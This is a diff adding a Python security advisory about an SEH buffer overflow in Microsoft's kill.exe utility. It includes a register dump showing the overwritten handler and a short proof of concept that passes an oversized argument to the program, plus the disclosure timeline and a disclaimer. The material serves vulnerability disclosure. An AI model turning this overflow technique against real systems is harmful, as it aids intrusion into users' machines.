@@ -1,0 +1,99 @@
+'''
+[+] Credits: HYP3RLINX
+[+] Website: hyp3rlinx.altervista.org
+[+] Source: http://hyp3rlinx.altervista.org/advisories/MS-KILL-UTILITY-BUFFER-OVERFLOW.txt
+[+] ISR: ApparitionSec
+
+
+Vendor:
+=================
+www.microsoft.com
+
+
+Product:
+=========================================
+Microsoft Process Kill Utility "kill.exe"
+File version: 6.3.9600.17298
+
+The Kill tool (kill.exe), a tool used to terminate a process, part of the
+WinDbg program.
+
+
+Vulnerability Type:
+===================
+Buffer Overflow
+
+
+SEH Buffer Overflow @ about 512 bytes
+
+
+Vulnerability Details:
+=====================
+
+Register dump
+
+
+'SEH chain of main thread
+Address    SE handler
+001AF688   kernel32.756F489B
+001AFBD8   52525252
+42424242   *** CORRUPT ENTRY ***
+
+
+001BF81C   41414141  AAAA
+001BF820   41414141  AAAA
+001BF824   41414141  AAAA
+001BF828   41414141  AAAA
+001BF82C   41414141  AAAA
+001BF830   41414141  AAAA
+001BF834   909006EB  ë  Pointer to next SEH record
+001BF838   52525252  RRRR  SE handler  <================
+001BF83C   90909090
+001BF840   90909090
+
+
+Exploit code(s):
+================
+
+Python POC.
+'''
+
+junk="A"*508+"RRRR"
+
+pgm='c:\\Program Files (x86)\\Windows Kits\\8.1\\Debuggers\\x86\\kill.exe '
+subprocess.Popen([pgm, junk], shell=False)
+
+
+'''
+Disclosure Timeline:
+==================================
+Vendor Notification: June 24, 2016
+Vendor reply:  Will not security service
+July 8, 2016  : Public Disclosure
+
+
+Exploitation Technique:
+=======================
+Local
+
+
+Severity Level:
+================
+Low
+
+
+[+] Disclaimer
+The information contained within this advisory is supplied "as-is" with no
+warranties or guarantees of fitness of use or otherwise.
+Permission is hereby granted for the redistribution of this advisory,
+provided that it is not altered except by reformatting it, and
+that due credit is given. Permission is explicitly given for insertion in
+vulnerability databases and similar, provided that due credit
+is given to the author. The author is not responsible for any misuse of the
+information contained herein and accepts no responsibility
+for any damage caused by the use or misuse of this information. The author
+prohibits any malicious use of security related information
+or exploits by the author or elsewhere.
+
+HYP3RLINX
+'''
